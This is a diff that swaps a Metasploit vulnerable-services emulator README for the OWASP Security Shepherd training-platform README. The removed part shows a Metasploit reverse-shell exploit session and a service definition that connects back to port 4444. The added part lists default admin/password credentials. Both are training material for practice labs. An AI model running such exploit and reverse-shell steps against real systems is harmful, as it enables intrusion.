@@ -1,123 +1,85 @@
-# Metasploit Vulnerable Services Emulator
+ 
+# OWASP Security Shepherd [![OWASP Flagship](https://img.shields.io/badge/owasp-flagship%20project-48A646.svg)](https://www.owasp.org/index.php/OWASP_Project_Inventory#tab=Flagship_Projects) 
+The [OWASP Security Shepherd Project](http://bit.ly/owaspSecurityShepherd) is a web and mobile application security training platform. Security Shepherd has been designed to foster and improve security awareness among a varied skill-set demographic. The aim of this project is to take AppSec novices or experienced engineers and sharpen their penetration testing skill set to security expert status.
 
-   Many IT professionals and engineers want to learn security because it's such a hot field right now.  There are many free tools 
-out there, one of the most famous is Metasploit.  An obvious route to teach oneself about security is to download Metasploit and
-play with it. However, without vulnerable services to test again, it's hard to play with Metasploit. 
+[![Build Status](https://travis-ci.com/OWASP/SecurityShepherd.svg?branch=dev)](https://travis-ci.com/OWASP/SecurityShepherd)
+  
+# Where can I download Security Shepherd?
 
-   The tool is created to emulate vulnerable services for the purpose of 
-* test Metasploit modules.  
-* help with training on Metasploit. 
+### Virtual Machine or Manual Setup
+You can download Security Shepherd VM's or Manual Installation Packs from [GitHub](https://github.com/OWASP/SecurityShepherd/releases)
 
-   It runs on Linux (Ubuntu), windows platform (hopefully Mac OSX). Currently it supports over 100 emulated vulnerable services,
-we will keep adding more to cover as many of the 1000+ modules in Metasploit as possible. 
+### Docker (Ubuntu Linux Host)
 
-# Key feature
+#### Initial Setup
+```console
+# Install pre-reqs
+sudo apt install git maven docker docker-compose default-jdk
 
-  To make it easy to add a new emulated service, we have designed it to be language independent: the service emulation is 
-in JSON format, one can add/remove/edit a service in JSON very quickly
+# Clone the github repository
+git clone https://github.com/OWASP/SecurityShepherd.git
 
-  A minor but interesting feature is that we make it easy to create SSL socket, all TCP sockets can automatically upgrade to SSL. 
+# Change directory into the local copy of the repository
+cd SecurityShepherd
 
-# Quick run
+# Adds current user to the docker group (don't have to run docker with sudo)
+sudo gpasswd -a $USER docker
 
-Note that the commands typed on the shell session spawned are actually executed on the target, so please run this emulator in a safe environment if you don't want it to be owned :-)
+# Run maven to generate the WAR and HTTPS Cert.
+mvn -Pdocker clean install -DskipTests
 
-You may have to install the following packages depending on your environment: IO::Socket::SSL Try::Tiny IO::Compress::Gzip Compress::Zlib Storable.
-On my Ubuntu, they can be installed as
-```
-sudo cpanm install IO::Socket::SSL Try::Tiny IO::Compress::Gzip Compress::Zlib Storable JSON
-```
-
-On vulnerability Emulator:
-```
-perl vulEmu.pl
->>activate exploits/windows/iis/ms01_023_printer
-
-```
-on Metasploit console:
-```
-msf > use exploit/windows/iis/ms01_023_printer
-msf > set payload windows/shell_reverse_tcp
-msf > setg RHOST 127.0.0.1
-msf > setg LHOST 127.0.0.1
-msf exploit(ms01_023_printer) > run
-
-[*] Started reverse TCP handler on 127.0.0.1:4444 
-[*] Command shell session 4 opened (127.0.0.1:4444 -> 127.0.0.1:51852) at 2017-01-20 10:47:12 -0600
-
->>ls
-README.md
-secret.txt
-server_cert.pem
-server_key.pem
-service.cfg
-vulEmu.pl
-
+# Build the docker images, docker network and bring up the environment
+docker-compose up
 ```
 
-# Run it with Docker
+Open up an Internet Browser & type in the address bar;
 
-If you want to run the above example in a container environment with docker, just run:
+* [localhost](http://localhost)
 
-```
-docker run --rm -it -p 80:80 vulnerables/metasploit-vulnerability-emulator
-```
+To login use the following credentials (you will be asked to update after login);
 
-Then you will be presented to the very same shell, if you don't have docker installed, just follow the instructions [here](https://docker.com).
+* username: ```admin```
+* password: ```password```
 
-Remember, you have to map the port that you want addding a `-p external-port:internal-port` argument. To map all ports present in service.cfg, please run this command:
+Note: Environment variables can be configured in dotenv ```.env``` file in the root dir.
 
-```
-docker run --rm -it \
-       -p 20:20 -p 21:21 -p 80:80 -p 443:443 -p 4848:4848 \
-       -p 6000:6000 -p 6060:6060 -p 7000:7000 -p 7181:7181 \
-       -p 7547:7547 -p 8000:8000 -p 8008:8008 -p 8020:8020 \
-       -p 8080:8080 -p 8400:8400 \
-       vulnerables/metasploit-vulnerability-emulator
-```
+#### Full Guide
+[Docker-Environment-Setup](https://github.com/OWASP/SecurityShepherd/wiki/Docker-Environment-Setup)
 
-# Developer overview
-
-
-The software has two parts
-
-* Server/service emulation description file in JSON  (service.cfg)
-* Interpreter (currently implemented in perl, but it can be done with other languages too)
-
-Here is a quick example from part of the service emulation description file, for the Metasploit module exploit/multi/http/tomcat_mgr_deploy.
-
-
-```
-	"exploit/multi/http/tomcat_mgr_deploy" : {
-		"defaultPort": [80],
-		"seq": [
-			["substr", "GET \/manager\/serverinfo"],
-			["HTTP/1.0 200 OK\r\nContent-Length: $\r\n\r\n", "!!OS Name: Linux\nOS Architecture: x86_64"],
-			["starts", "PUT /manager/deploy?path="],
-			["HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n", {
-				"connect": "127.0.0.1:4444"
-			}]
-		]
-	},
-```
-
- The most important part is the "seq" array. it always has even number of entries.  When a message is received, it's compared
-to the entries 0, 2, 4 ... Once a match is found, it will execute the entry immediately after it.  For example, if an entry
-matches with entry 2, it will execute the statements in entry 3. 
-
- The matching entries have the matching actions such as
-
-* **substr**:  do a substring match
-* **regex**:   do a regular expression match
-* **starts**:  check if incoming message starts with the string in the entry
-
-  The execution entry itself can have multiple entries. Each entry can be just a string, an array or dictionary. strings and arrays
-are used to build the response message (by concatentation).  For an array, it has a few elements, the first element is action type,
-such as
-
-* **repeat**:  return a string after repeating the string (second element) by the certain number of times specified by the third element.
-* **nsize**:   return the size of the element
-* **gzip**:    return the gzipped content
-   
-   It can also do compacting of string into binary data, such as  ["N", 123] which will compact the number 123 into big-endean 
-4-byte integer.
+# How do I setup Security Shepherd?
+We've got fully automated and step by step walkthroughs on our [wiki page](https://github.com/markdenihan/owaspSecurityShepherd/wiki) to help you get Security Shepherd up and running.
+  
+# What can Security Shepherd be used for?
+Security Shepherd can be used as a;
+* Teaching Tool for All Application Security
+* Web Application Pen Testing Training Platform
+* Mobile Application Pen Testing Training
+* Safe Playground to Practise AppSec Techniques
+* Platform to demonstrate real Security Risk examples
+  
+# Why choose Security Shepherd?
+There are a lot of purposefully vulnerable applications available in the OWASP Project Inventory, and even more across the internet. Why should you use Security Shepherd? Here are a few reasons;  
+* **Wide Topic Coverage**  
+Shepherd includes over sixty levels across the entire spectrum of Web and Mobile application security under a single project.
+* **Gentle Learning Curve**  
+Shepherd is a perfect for users completely new to security with levels increases in difficulty at a pleasant pace.
+* **Layman Write Ups**  
+When each security concept is first presented in Shepherd, it is done so in layman terms so that anyone (even beginners) can absorb them.
+* **Real World Examples**  
+The security risks in Shepherd are real vulnerabilities that have had their exploit impact dampened to protect the application, users, and environment. There are no simulated security risks which require an expected, specific attack vector in order to pass a level. Attack vectors when used on Shepherd are how they would behave in the real world.
+* **Scalability**  
+Shepherd can be used locally by a single user or easily as a server for a high amount of users.
+* **Highly Customisable**  
+Shepherd enables admins to set what levels are available to their users and in what way they are presentended (Open, CTF and Tournament Layouts)
+* **Perfect for Classrooms**  
+Shepherd gives it's players user specific solution keys to prevent students from sharing keys, rather than going through the steps required to complete a level.
+* **Scoreboard**  
+Security Shepherd has a configurable scoreboard to encourage a competitive learning environment. Users that complete levels first, second and third get medals on their scoreboard entry and bonus points to keep things entertaining on the scoreboard.
+* **User Management**  
+Security Shepherd admins can create users, create admins, suspend, unsuspend, add bonus points, or take penalty points away from user's accounts with the admin user management controls. Admins can also segment their students into specific class groups. Admins can view the progress a class has made to identify struggling participants. An admin can even close public registration and manually create users if they wish for a private experience.
+* **Robust Service**  
+Shepherd has been used to run online CTFs such as the OWASP Global CTF and OWASP LATAM Tour CTF 2015, both surpassing 200 active users and running with no down time, bar planned maintenance periods.
+* **Configurable Feedback**  
+An administrator can enable a feedback process, which must be completed by users before a level is marked as complete. This is used both to facilitate project improvements based on feedback submitted and for system administrators to collect "Reports of Understanding" from their students.
+* **Granular Logging**  
+The logs reported by Security Shepherd are highly detailed and descriptive, but not screen blinding. If a user is misbehaving, you will know.
